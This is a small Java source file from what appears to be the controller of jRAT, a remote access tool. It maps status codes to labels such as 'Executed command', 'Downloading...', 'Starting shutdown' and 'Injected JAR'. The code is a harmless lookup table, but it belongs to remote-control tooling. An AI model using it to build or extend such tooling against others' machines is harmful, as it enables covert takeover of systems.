package io.jrat.controller;

import io.jrat.common.Constants;

import java.util.HashMap;

public class Status {

	private static final HashMap<Integer, String> statuses = new HashMap<Integer, String>();

	static {
		statuses.put(Constants.STATUS_EXECUTED_FILE, "Executed file");
		statuses.put(Constants.STATUS_DOWNLOADING_FILE, "Downloading...");
		statuses.put(Constants.STATUS_FAILED_FILE, "Failed downloading");
		statuses.put(Constants.STATUS_READY, "Ready");
		statuses.put(Constants.STATUS_DISPLAYED_MSGBOX, "Opened messagebox");
		statuses.put(Constants.STATUS_FAILED_SHUTDOWN, "Failed shutdown");
		statuses.put(Constants.STATUS_STARTING_SHUTDOWN, "Starting shutdown");
		statuses.put(Constants.STATUS_RAN_CMD, "Executed command");
		statuses.put(Constants.STATUS_MKDIR, "Folder created");
		statuses.put(Constants.STATUS_INJECTED, "Injected JAR");
	}

	public static String getStatusFromID(int i) {
		return statuses.get(i);
	}

}
